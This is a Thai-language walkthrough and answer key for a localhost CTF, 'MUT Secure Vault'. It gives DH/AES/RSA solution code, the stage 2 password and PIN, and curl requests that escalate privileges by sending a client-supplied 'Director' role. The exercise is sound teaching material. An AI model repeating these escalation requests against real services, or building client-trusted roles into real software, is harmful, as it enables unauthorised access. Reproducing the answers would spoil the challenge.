# MUT Secure Vault - คู่มือผู้เล่น (ฉบับง่าย)

ยินดีต้อนรับ Agent! คู่มือนี้จะช่วยนำทางคุณผ่านด่าน CTF ของ MUT Secure Vault

## เริ่มต้นใช้งาน

1. ไปที่ http://localhost:5173
2. ลงทะเบียนและเข้าสู่ระบบ
3. คลิก "เริ่มเกม"

---

## ด่าน 1: Cryptography

### วิธีที่ 1: โหมดง่าย (แนะนำ)
ใช้ endpoint `/api/c1/easy-decrypt` ที่จะทำทุกอย่างให้อัตโนมัติ!

```bash
curl http://localhost:3001/api/c1/easy-decrypt \
  -H "Authorization: Bearer $TOKEN"
```

Response จะให้:
- `decryptedMessage`: ข้อความที่ถอดรหัสแล้ว
- `signature`: ลายเซ็นดิจิทัล

แล้วสร้าง FLAG_1:
```python
import hashlib
data = message + "1990" + signature
FLAG_1 = f"MUT{{{hashlib.sha256(data.encode()).hexdigest()[:32]}}}"
```

---

### วิธีที่ 2: โหมดยาก (ทำเองทั้งหมด)

#### ขั้นตอนที่ 1: ดาวน์โหลด Artifacts
```bash
curl http://localhost:3001/api/c1/artifacts -H "Authorization: Bearer $TOKEN"
```

#### ขั้นตอนที่ 2: Diffie-Hellman Key Exchange
```python
import random

# ค่าจาก artifacts
p = int(artifacts['diffieHellman']['prime'], 16)
g = int(artifacts['diffieHellman']['generator'], 16)

# สร้าง client private key
a = random.getrandbits(256)

# คำนวณ client public key: A = g^a mod p
A = pow(g, a, p)

# ส่งไป server
# POST /api/c1/dh/exchange กับ {"clientPublicKey": hex(A)[2:]}

# รับ server public key (B) แล้วคำนวณ shared secret
shared_secret = pow(B, a, p)
```

#### ขั้นตอนที่ 3: สร้าง AES Key
```python
import hashlib
key_data = hex(shared_secret)[2:] + "SUT1990"
aes_key = hashlib.sha256(key_data.encode()).digest()
```

#### ขั้นตอนที่ 4: ถอดรหัส AES-256-CBC
```python
from Crypto.Cipher import AES

# GET /api/c1/encrypted
iv = bytes.fromhex(artifacts['aes']['iv'])
encrypted_data = bytes.fromhex(encrypted_response['encrypted']['data'])

cipher = AES.new(aes_key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(encrypted_data)
message = decrypted[:-decrypted[-1]].decode()  # ลบ PKCS7 padding
```

#### ขั้นตอนที่ 5: ตรวจสอบลายเซ็น RSA (ไม่บังคับ)
```python
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256

# GET /api/c1/signature
public_key = RSA.import_key(artifacts['rsa']['publicKey'])
h = SHA256.new(message.encode())
pkcs1_15.new(public_key).verify(h, signature_bytes)
```

#### ขั้นตอนที่ 6: สร้าง FLAG_1
```python
flag_data = message + "1990" + signature_hex
FLAG_1 = f"MUT{{{hashlib.sha256(flag_data.encode()).hexdigest()[:32]}}}"
```

---

### ส่งคำตอบ
```bash
curl -X POST http://localhost:3001/api/c1/submit-flag \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag": "MUT{your_flag_here}"}'
```

---

## ด่าน 2: Authentication (2 ปัจจัย)

### คำตอบ
| ปัจจัย | คำตอบ |
|--------|--------|
| **รหัสผ่าน** | `Suranaree1990!` |
| **PIN** | `30000` |

### วิธีทำ

```bash
# ปัจจัยที่ 1: รหัสผ่าน
curl -X POST http://localhost:3001/api/c2/password \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"password": "Suranaree1990!"}'

# ปัจจัยที่ 2: PIN
curl -X POST http://localhost:3001/api/c2/pin \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"pin": "30000"}'

# รับ FLAG_2
curl http://localhost:3001/api/c2/mfa/status \
  -H "Authorization: Bearer $TOKEN"

# ส่ง FLAG_2
curl -X POST http://localhost:3001/api/c2/submit-flag \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag": "MUT{...}"}'
```

---

## ด่าน 3: Authorization (2 ช่องโหว่)

### ขั้นตอนที่ 1: อัพเกรดบทบาท
```bash
curl -X POST http://localhost:3001/api/c3/request-access \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"resource": "any", "reason": "any"}'
```
ผลลัพธ์: บทบาทเปลี่ยนจาก Student → Researcher

### ขั้นตอนที่ 2: เข้าถึงไฟล์ลับที่สุด
```bash
curl -X POST http://localhost:3001/api/c3/declassify \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "resource": "FINAL_FLAG.txt",
    "requester_role": "Director",
    "reason": "any"
  }'
```

### ขั้นตอนที่ 3: รับและส่ง Flag
```bash
# รับ flag
curl http://localhost:3001/api/c3/final-flag \
  -H "Authorization: Bearer $TOKEN"

# ส่ง flag
curl -X POST http://localhost:3001/api/c3/submit-flag \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag": "MUT{...}"}'
```

---

## สรุปข้อมูลสำคัญ

| ข้อมูล | ค่า |
|--------|-----|
| ปีก่อตั้ง มทส. | 1990 |
| รหัสไปรษณีย์นครราชสีมา | 30000 |
| รหัสผ่าน | Suranaree1990! |
| PIN | 30000 |

---

## เคล็ดลับ

1. **ใช้โหมดง่าย** - ด่าน 1 มี `/api/c1/easy-decrypt` ที่ทำให้อัตโนมัติ
2. **อ่านคำใบ้ใน API** - ทุก endpoint มีคำใบ้ชัดเจน
3. **ใช้ curl หรือ Postman** - ง่ายกว่าเขียนโค้ดเอง

ขอให้โชคดี!
